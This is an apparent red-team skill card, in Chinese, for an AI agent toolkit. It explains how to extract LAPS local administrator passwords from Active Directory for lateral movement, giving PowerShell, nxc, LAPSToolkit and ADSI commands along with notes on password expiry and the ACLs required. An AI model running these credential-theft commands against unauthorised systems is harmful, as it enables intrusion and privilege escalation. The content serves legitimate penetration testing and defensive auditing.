---
name: 'laps-password-extraction'
description: 'LAPS密码提取：ms-Mcs-AdmPwd/v2加密版本、nxc laps模块、ACL要求。横向移动关键凭据源。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。

## LAPS 密码提取

> Local Administrator Password Solution — 微软官方方案，每台机器本地 Admin 密码随机化并存于 AD

### 枚举 LAPS 是否启用
```powershell
# 检查 AD 对象上是否有 ms-Mcs-AdmPwd 属性
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {$_.'ms-Mcs-AdmPwd'}
# 或者
Get-ADComputer -Filter * -Properties * | Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null}
```text

### 读取 LAPS 密码（需要 Read 权限）
```bash
# nxc
nxc ldap <DC> -u <user> -p <pass> -M laps

# LAPSToolkit.ps1
Get-LAPSComputers
Find-AdmPwdExtendedRights -Identity "OU=Servers,..."

# 直接 ADSI
([ADSI]"LDAP://CN=COMPNAME,OU=...,DC=domain,DC=local").'ms-Mcs-AdmPwd'
```text

### LAPS v2 vs v1
- v1: `ms-Mcs-AdmPwd` 属性
- v2: `msLAPS-EncryptedPassword` + `msLAPS-PasswordExpirationTime`（加密存储）

### 密码过期
- 默认 30 天滚动 — 拿到一次密码不等于永久访问
- 可能需要在过期窗口内（`ms-Mcs-AdmPwdExpirationTime` / `msLAPS-PasswordExpirationTime`）

### 关键 ACL
- 读取 LAPS 密码需要 `AllExtendedRights` 或特定委派
- BloodHound: `ReadLAPSPassword` 边
